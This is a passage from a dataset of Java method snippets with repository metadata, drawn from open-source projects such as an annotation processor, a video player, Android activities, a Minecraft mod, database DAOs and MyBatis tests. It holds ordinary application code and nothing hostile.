https://stackoverflow.com/questions/7687829/java-6-annotation-processing-getting-a-class-from-an-annotation/52793839#52793839\n            try {\n                currentParameter.starDriverInit.after();\n            } catch (javax.lang.model.type.MirroredTypesException mte) {\n                List<? extends TypeMirror> typeMirrors = mte.getTypeMirrors();\n                for (TypeMirror typeMirror : typeMirrors) {\n                    ProcessClassNode node = mNodeHashMap.get(typeMirror.toString());\n                    currentNode.count++;\n                    node.next.add(currentNode);\n                }\n            }\n            try {\n                currentParameter.starDriverInit.before();\n            } catch (javax.lang.model.type.MirroredTypesException mte) {\n                List<? extends TypeMirror> typeMirrors = mte.getTypeMirrors();\n                for (TypeMirror typeMirror : typeMirrors) {\n                    ProcessClassNode node = mNodeHashMap.get(typeMirror.toString());\n                    node.count++;\n                    currentNode.next.add(node);\n                }\n            }\n        }\n        List<ClassParameter> list = new ArrayList<>(entries.size());\n        Stack<ProcessClassNode> stack = new Stack<>();\n        for (Map.Entry<String, ProcessClassNode> entry : entries) {\n            if (entry.getValue().count == 0) {\n                stack.push(entry.getValue());\n            }\n        }\n        while (!stack.isEmpty()) {\n            ProcessClassNode processClassNode = stack.pop();\n            if (processClassNode == null) {\n                break;\n            }\n            for (ProcessClassNode node : processClassNode.next) {\n                node.count--;\n                if (node.count == 0) {\n                    stack.push(node);\n                }\n            }\n            list.add(processClassNode.value);\n        }\n\n        if (list.size() != entries.size()) {\n            for (ClassParameter classParameter : list) {\n                mNodeHashMap.remove(classParameter.classFullName);\n            }\n            StringBuilder sb = new StringBuilder(\"The init tasks is Cycle, please check it carefully -> \\n\");\n            for (Map.Entry<String, ProcessClassNode> entry : entries) {\n                sb.append(entry.getValue().value.classFullName);\n                sb.append(\"\\n\");\n            }\n            throw new IllegalStateException(sb.toString());\n        }\n\n        for (ClassParameter parameter : list) {\n            methodBuilder.addJavadoc(\"\\\"\" + parameter.simpleName + \"\\\"\" + \" - >\");\n        }\n\n        methodBuilder.addStatement(\"long now = 0L\");\n        for (ClassParameter parameter : list) {\n            TypeVariableName t = TypeVariableName.get(parameter.classFullName);\n            String resultName = parameter.classSimpleName + \"_result\";\n            methodBuilder.addStatement(\"now = $T.currentTimeMillis()\", System.class);\n            methodBuilder.addStatement(\"$T \" + parameter.classSimpleName + \" = new $T()\", t, t);\n            methodBuilder.addStatement(\"$T \" + resultName + \" = new $T()\", result, result);\n            methodBuilder.addStatement(parameter.classSimpleName + \".initialize(context\" + \", \" + resultName + \")\");\n            methodBuilder.addStatement(resultName + \".useTime = System.currentTimeMillis() - now\");\n            methodBuilder.addStatement(resultName + \".name = \\\"\" + parameter.starDriverInit.name() + \"\\\"\");\n            methodBuilder.addStatement(resultName + \".className = \\\"\" + parameter.classFullName + \"\\\"\");\n            methodBuilder.addStatement(\"resultList.add(\" + resultName + \")\");\n        }\n        methodBuilder.addStatement(\"return resultList\");\n        return methodBuilder.build();\n    }", "url": "https://raw.githubusercontent.com/succlz123/StarDriver-APT/master/stardriver-apt-processor/src/main/java/org/succlz123/stardriver/StarDriverProcessor.java", "stars": "4", "class_props": {"extends": "AbstractProcessor", "implements": null, "modifiers": ["public"]}}, {"id": 34084, "method_name": "compareTo", "class_name": "ProcessClassNode", "params": ["ProcessClassNode"], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "        public int compareTo(ProcessClassNode processClassNode) {\n            return count - processClassNode.count;\n        }", "url": "https://raw.githubusercontent.com/succlz123/StarDriver-APT/master/stardriver-apt-processor/src/main/java/org/succlz123/stardriver/StarDriverProcessor.java", "stars": "4", "class_props": {"extends": null, "implements": ["Comparable"], "modifiers": ["private", "static"]}}, {"id": 34085, "method_name": "createDataSourceInternal", "class_name": "GSYExoHttpDataSourceFactory", "params": ["HttpDataSource"], "throws": null, "modifiers": ["protected"], "return_type": "GSYExoHttpDataSource", "snippet": "    protected GSYExoHttpDataSource createDataSourceInternal(\n            HttpDataSource.RequestProperties defaultRequestProperties) {\n        GSYExoHttpDataSource dataSource =\n                new GSYExoHttpDataSource(\n                        userAgent,\n                        /* contentTypePredicate= */ null,\n                        connectTimeoutMillis,\n                        readTimeoutMillis,\n                        allowCrossProtocolRedirects,\n                        defaultRequestProperties);\n        if (listener != null) {\n            dataSource.addTransferListener(listener);\n        }\n        return dataSource;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/tv/danmaku/ijk/media/exo2/source/GSYExoHttpDataSourceFactory.java", "stars": "2", "class_props": {"extends": "BaseFactory", "implements": null, "modifiers": ["final", "public"]}}, {"id": 34086, "method_name": "onCreate", "class_name": "SelectValueActivity", "params": ["Bundle"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n\n        mAudioManager = (AudioManager) getSystemService(Context.AUDIO_SERVICE);\n\n        mAdapter = new SelectValueScrollAdapter(\n                this, getIntent().getIntExtra(EXTRA_COUNT, DEFAULT_COUNT));\n\n        mView = new CardScrollView(this) {\n            @Override\n            public final boolean dispatchGenericFocusedEvent(MotionEvent event) {\n                if (mDetector.onMotionEvent(event)) {\n                    return true;\n                }\n                return super.dispatchGenericFocusedEvent(event);\n            }\n        };\n        mView.setAdapter(mAdapter);\n        setContentView(mView);\n\n        mDetector = new GestureDetector(this).setBaseListener(this);\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/Timer/src/com/google/android/glass/sample/timer/SelectValueActivity.java", "stars": "74", "class_props": {"extends": "Activity", "implements": ["GestureDetector"], "modifiers": ["public"]}}, {"id": 34087, "method_name": "onResume", "class_name": "SelectValueActivity", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onResume() {\n        super.onResume();\n        mView.activate();\n        mView.setSelection(getIntent().getIntExtra(EXTRA_INITIAL_VALUE, 0));\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/Timer/src/com/google/android/glass/sample/timer/SelectValueActivity.java", "stars": "74", "class_props": {"extends": "Activity", "implements": ["GestureDetector"], "modifiers": ["public"]}}, {"id": 34088, "method_name": "onPause", "class_name": "SelectValueActivity", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onPause() {\n        super.onPause();\n        mView.deactivate();\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/Timer/src/com/google/android/glass/sample/timer/SelectValueActivity.java", "stars": "74", "class_props": {"extends": "Activity", "implements": ["GestureDetector"], "modifiers": ["public"]}}, {"id": 34089, "method_name": "onGenericMotionEvent", "class_name": "SelectValueActivity", "params": ["MotionEvent"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean onGenericMotionEvent(MotionEvent event) {\n        return mDetector.onMotionEvent(event);\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/Timer/src/com/google/android/glass/sample/timer/SelectValueActivity.java", "stars": "74", "class_props": {"extends": "Activity", "implements": ["GestureDetector"], "modifiers": ["public"]}}, {"id": 34090, "method_name": "onGesture", "class_name": "SelectValueActivity", "params": ["Gesture"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean onGesture(Gesture gesture) {\n        if (gesture == Gesture.TAP) {\n            Intent resultIntent = new Intent();\n            resultIntent.putExtra(EXTRA_SELECTED_VALUE, mView.getSelectedItemPosition());\n            setResult(RESULT_OK, resultIntent);\n            mAudioManager.playSoundEffect(AudioManager.FX_KEY_CLICK);\n            finish();\n            return true;\n        }\n        return false;\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/Timer/src/com/google/android/glass/sample/timer/SelectValueActivity.java", "stars": "74", "class_props": {"extends": "Activity", "implements": ["GestureDetector"], "modifiers": ["public"]}}, {"id": 34091, "method_name": "initElements", "class_name": "OakParquetSlabBlock", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void initElements() {\n\t\telements.blocks.add(() -> new CustomBlock());\n\t\telements.items\n\t\t\t\t.add(() -> new BlockItem(block, new Item.Properties().group(ItemGroup.BUILDING_BLOCKS)).setRegistryName(block.getRegistryName()));\n\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/OakParquetSlabBlock.java", "stars": "2", "class_props": {"extends": "EnhancedVanillaElements", "implements": null, "modifiers": ["public"]}}, {"id": 34092, "method_name": "getDrops", "class_name": "CustomBlock", "params": ["BlockState", "LootContext"], "throws": null, "modifiers": ["public"], "return_type": "List<ItemStack>", "snippet": "\t\tpublic List<ItemStack> getDrops(BlockState state, LootContext.Builder builder) {\n\t\t\tList<ItemStack> dropsOriginal = super.getDrops(state, builder);\n\t\t\tif (!dropsOriginal.isEmpty())\n\t\t\t\treturn dropsOriginal;\n\t\t\treturn Collections.singletonList(new ItemStack(this, state.get(TYPE) == SlabType.DOUBLE ? 2 : 1));\n\t\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/OakParquetSlabBlock.java", "stars": "2", "class_props": {"extends": "SlabBlock", "implements": null, "modifiers": ["public", "static"]}}, {"id": 34093, "method_name": "postExecutorEvent", "class_name": "ExecutorEventsDao", "params": ["Executor", "EventType", "String", "String"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void postExecutorEvent(final Executor executor, final EventType type, final String user,\n      final String message) throws ExecutorManagerException {\n    final String INSERT_PROJECT_EVENTS =\n        \"INSERT INTO executor_events (executor_id, event_type, event_time, username, message) values (?,?,?,?,?)\";\n    try {\n      this.dbOperator.update(INSERT_PROJECT_EVENTS, executor.getId(), type.getNumVal(),\n          new Date(), user, message);\n    } catch (final SQLException e) {\n      throw new ExecutorManagerException(\"Failed to post executor event\", e);\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorEventsDao.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34094, "method_name": "getExecutorEvents", "class_name": "ExecutorEventsDao", "params": ["Executor", "int", "int"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "List<ExecutorLogEvent>", "snippet": "  public List<ExecutorLogEvent> getExecutorEvents(final Executor executor, final int num,\n      final int offset)\n      throws ExecutorManagerException {\n    try {\n      return this.dbOperator.query(ExecutorLogsResultHandler.SELECT_EXECUTOR_EVENTS_ORDER,\n          new ExecutorLogsResultHandler(), executor.getId(), num, offset);\n    } catch (final SQLException e) {\n      throw new ExecutorManagerException(\n          \"Failed to fetch events for executor id : \" + executor.getId(), e);\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorEventsDao.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34095, "method_name": "handle", "class_name": "ExecutorLogsResultHandler", "params": ["ResultSet"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "List<ExecutorLogEvent>", "snippet": "    public List<ExecutorLogEvent> handle(final ResultSet rs) throws SQLException {\n      if (!rs.next()) {\n        return Collections.<ExecutorLogEvent>emptyList();\n      }\n\n      final ArrayList<ExecutorLogEvent> events = new ArrayList<>();\n      do {\n        final int executorId = rs.getInt(1);\n        final int eventType = rs.getInt(2);\n        final Date eventTime = rs.getDate(3);\n        final String username = rs.getString(4);\n        final String message = rs.getString(5);\n\n        final ExecutorLogEvent event =\n            new ExecutorLogEvent(executorId, username, eventTime,\n                EventType.fromInteger(eventType), message);\n        events.add(event);\n      } while (rs.next());\n\n      return events;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorEventsDao.java", "stars": "18", "class_props": {"extends": null, "implements": ["ResultSetHandler"], "modifiers": ["private", "static"]}}, {"id": 34096, "method_name": "getId", "class_name": "ExecutorNode", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer getId() {\n        return id;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/job/domain/ExecutorNode.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34097, "method_name": "setId", "class_name": "ExecutorNode", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setId(Integer id) {\n        this.id = id;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/job/domain/ExecutorNode.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34098, "method_name": "getAddress", "class_name": "ExecutorNode", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getAddress() {\n        return address;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/job/domain/ExecutorNode.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34099, "method_name": "setAddress", "class_name": "ExecutorNode", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setAddress(String address) {\n        this.address = address;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/job/domain/ExecutorNode.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34100, "method_name": "getHeartbeatTime", "class_name": "ExecutorNode", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Date", "snippet": "    public Date getHeartbeatTime() {\n        return heartbeatTime;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/job/domain/ExecutorNode.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34101, "method_name": "setHeartbeatTime", "class_name": "ExecutorNode", "params": ["Date"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setHeartbeatTime(Date heartbeatTime) {\n        this.heartbeatTime = heartbeatTime;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/job/domain/ExecutorNode.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34102, "method_name": "getStatus", "class_name": "ExecutorNode", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer getStatus() {\n        return status;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/job/domain/ExecutorNode.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34103, "method_name": "setStatus", "class_name": "ExecutorNode", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setStatus(Integer status) {\n        this.status = status;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/job/domain/ExecutorNode.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34104, "method_name": "getMemRate", "class_name": "ExecutorNode", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Float", "snippet": "    public Float getMemRate() {\n        return memRate;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/job/domain/ExecutorNode.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34105, "method_name": "setMemRate", "class_name": "ExecutorNode", "params": ["Float"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setMemRate(Float memRate) {\n        this.memRate = memRate;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/job/domain/ExecutorNode.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34106, "method_name": "getCpuRate", "class_name": "ExecutorNode", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Float", "snippet": "    public Float getCpuRate() {\n        return cpuRate;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/job/domain/ExecutorNode.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34107, "method_name": "setCpuRate", "class_name": "ExecutorNode", "params": ["Float"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setCpuRate(Float cpuRate) {\n        this.cpuRate = cpuRate;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/job/domain/ExecutorNode.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34108, "method_name": "getTaskStates", "class_name": "ExecutorNode", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<TaskState>", "snippet": "    public List<TaskState> getTaskStates() {\n        return taskStates;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/job/domain/ExecutorNode.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34109, "method_name": "setTaskStates", "class_name": "ExecutorNode", "params": ["List<TaskState>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setTaskStates(List<TaskState> taskStates) {\n        this.taskStates = taskStates;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/job/domain/ExecutorNode.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34110, "method_name": "getTabIds", "class_name": "ExecutorNode", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<Integer>", "snippet": "    public List<Integer> getTabIds() {\n        return tabIds;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/job/domain/ExecutorNode.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34111, "method_name": "setTabIds", "class_name": "ExecutorNode", "params": ["List<Integer>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setTabIds(List<Integer> tabIds) {\n        this.tabIds = tabIds;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/job/domain/ExecutorNode.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34112, "method_name": "equals", "class_name": "ExecutorNode", "params": ["Object"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean equals(Object obj) {\n        if(obj instanceof ExecutorNode){\n            return address.equals(((ExecutorNode) obj).address);\n        }\n        return address.equals(obj);\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/job/domain/ExecutorNode.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34113, "method_name": "hashCode", "class_name": "ExecutorNode", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int hashCode() {\n        return address.hashCode();\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/job/domain/ExecutorNode.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34114, "method_name": "getTabNames", "class_name": "ExecutorNode", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<String>", "snippet": "    public List<String> getTabNames() {\n        return tabNames;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/job/domain/ExecutorNode.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34115, "method_name": "setTabNames", "class_name": "ExecutorNode", "params": ["List<String>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setTabNames(List<String> tabNames) {\n        this.tabNames = tabNames;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/job/domain/ExecutorNode.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34116, "method_name": "isDefaultNode", "class_name": "ExecutorNode", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isDefaultNode() {\n        return defaultNode;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/job/domain/ExecutorNode.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34117, "method_name": "setDefaultNode", "class_name": "ExecutorNode", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setDefaultNode(boolean defaultNode) {\n        this.defaultNode = defaultNode;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/job/domain/ExecutorNode.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34118, "method_name": "setUp", "class_name": "PostgresGeneratedKeysTest", "params": [], "throws": ["Exception"], "modifiers": ["static"], "return_type": "void", "snippet": "  static void setUp() throws Exception {\n    Configuration configuration = new Configuration();\n    Environment environment = new Environment(\"development\", new JdbcTransactionFactory(),\n        PgContainer.getUnpooledDataSource());\n    configuration.setEnvironment(environment);\n    configuration.setUseGeneratedKeys(true);\n    configuration.addMapper(Mapper.class);\n    sqlSessionFactory = new SqlSessionFactoryBuilder().build(configuration);\n\n    BaseDataTest.runScript(sqlSessionFactory.getConfiguration().getEnvironment().getDataSource(),\n        \"org/apache/ibatis/submitted/postgres_genkeys/CreateDB.sql\");\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/postgres_genkeys/PostgresGeneratedKeysTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 34119, "method_name": "testInsertIntoTableWithNoSerialColumn", "class_name": "PostgresGeneratedKeysTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void testInsertIntoTableWithNoSerialColumn() {\n    try (SqlSession sqlSession = sqlSessionFactory.openSession()) {\n      Mapper mapper = sqlSession.getMapper(Mapper.class);\n      Section section = new Section();\n      section.setSectionId(2);\n      section.setName(\"Section 2\");\n      int result = mapper.insertSection(section);\n      assertEquals(1, result);\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/postgres_genkeys/PostgresGeneratedKeysTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 34120, "method_name": "testUpdateTableWithSerial", "class_name": "PostgresGeneratedKeysTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void testUpdateTableWithSerial() {\n    try (SqlSession sqlSession = sqlSessionFactory.openSession()) {\n      Mapper mapper = sqlSession.getMapper(Mapper.class);\n      User user = new User();\n      user.setUserId(1);\n      user.setName(\"Ethan\");\n      int result = mapper.updateUser(user);\n      assertEquals(1, result);\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/postgres_genkeys/PostgresGeneratedKeysTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 34121, "method_name": "testUnusedGeneratedKey", "class_name": "PostgresGeneratedKeysTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void testUnusedGeneratedKey() {\n    try (SqlSession sqlSession = sqlSessionFactory.openSession()) {\n      Mapper mapper = sqlSession.getMapper(Mapper.class);\n      int result = mapper.insertUser(\"John\");\n      assertEquals(1, result);\n    }\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/postgres_genkeys/PostgresGeneratedKeysTest.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 34122, "method_name": "main", "class_name": "Demo03EntrySet", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {\n        //\u521b\u5efaMap\u96c6\u5408\u5bf9\u8c61\n        Map<String,Integer> map = new HashMap<>();\n        map.put(\"\u8d75\u4e3d\u9896\",168);\n        map.put(\"\u6768\u9896\",165);\n        map.put(\"\u6797\u5fd7\u73b2\",178);\n\n        //1.\u4f7f\u7528Map\u96c6\u5408\u4e2d\u7684\u65b9\u6cd5entrySet(),\u628aMap\u96c6\u5408\u4e2d\u591a\u4e2aEntry\u5bf9\u8c61\u53d6\u51fa\u6765,\u5b58\u50a8\u5230\u4e00\u4e2aSet\u96c6\u5408\u4e2d\n        Set<Map.Entry<String, Integer>> set = map.entrySet();\n\n        //2.\u904d\u5386Set\u96c6\u5408,\u83b7\u53d6\u6bcf\u4e00\u4e2aEntry\u5bf9\u8c61\n        //\u4f7f\u7528\u8fed\u4ee3\u5668\u904d\u5386Set\u96c6\u5408\n        Iterator<Map.Entry<String, Integer>> it = set.iterator();\n        while(it.hasNext()){\n            Map.Entry<String, Integer> entry = it.next();\n            //3.\u4f7f\u7528Entry\u5bf9\u8c61\u4e2d\u7684\u65b9\u6cd5getKey()\u548cgetValue()\u83b7\u53d6\u952e\u4e0e\u503c\n            String key = entry.getKey();\n            Integer value = entry.getValue();\n            System.out.println(key+\"=\"+value);\n        }\n        System.out.println(\"-----------------------\");\n        for(Map.Entry<String,Integer> entry:set){\n            //3.\u4f7f\u7528Entry\u5bf9\u8c61\u4e2d\u7684\u65b9\u6cd5getKey()\u548cgetValue()\u83b7\u53d6\u952e\u4e0e\u503c\n            String key = entry.getKey();\n            Integer value = entry.getValue();\n            System.out.println(key+\"=\"+value);\n        }\n    }", "url": "https://raw.githubusercontent.com/liuminchao123/JavaWeb_Learning/master/02.%20java/Java/%E9%BB%91%E9%A9%AC%E6%95%99%E7%A8%8B/15.%E3%80%90Map%E3%80%91-%E7%AC%94%E8%AE%B0/code/04_Map/src/com/itheima/demo01/Map/Demo03EntrySet.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34123, "method_name": "onDraw", "class_name": "GridSpaceDecoration", "params": ["Canvas", "RecyclerView", "RecyclerView"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onDraw(@NonNull Canvas canvas, @NonNull RecyclerView recyclerView, @NonNull RecyclerView.State state) {}", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/other/GridSpaceDecoration.java", "stars": "1", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["final", "public"]}}, {"id": 34124, "method_name": "getItemOffsets", "class_name": "GridSpaceDecoration", "params": ["Rect", "View", "RecyclerView", "RecyclerView"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void getItemOffsets(@NonNull Rect rect, @NonNull View view, RecyclerView recyclerView, @NonNull RecyclerView.State state) {\n        int position = recyclerView.getChildAdapterPosition(view);\n        int spanCount = ((GridLayoutManager) recyclerView.getLayoutManager()).getSpanCount();\n\n        // \u6bcf\u4e00\u884c\u7684\u6700\u540e\u4e00\u4e2a\u624d\u7559\u51fa\u53f3\u8fb9\u95f4\u9699\n        if ((position + 1) % spanCount == 0) {\n            rect.right = mSpace;\n        }\n\n        // \u53ea\u6709\u7b2c\u4e00\u884c\u624d\u7559\u51fa\u9876\u90e8\u95f4\u9699\n        if (position < spanCount) {\n            rect.top = mSpace;\n        }\n\n        rect.bottom = mSpace;\n        rect.left = mSpace;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/other/GridSpaceDecoration.java", "stars": "1", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["final", "public"]}}, {"id": 34125, "method_name": "onDrawOver", "class_name": "GridSpaceDecoration", "params": ["Canvas", "RecyclerView", "RecyclerView"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onDrawOver(@NonNull Canvas canvas, @NonNull RecyclerView recyclerView, @NonNull RecyclerView.State state) {}", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/other/GridSpaceDecoration.java", "stars": "1", "class_props": {"extends": "RecyclerView", "implements": null, "modifiers": ["final", "public"]}}, {"id": 34126, "method_name": "setTypeface", "class_name": "AutoResizeRobotoTextView", "params": ["Typeface"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setTypeface(final Typeface tf) {\n        if (mPaint == null)\n            mPaint = new TextPaint(getPaint());\n        mPaint.setTypeface(tf);\n        super.setTypeface(tf);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/widget/AutoResizeRobotoTextView.java", "stars": "4", "class_props": {"extends": "AppCompatTextView", "implements": null, "modifiers": 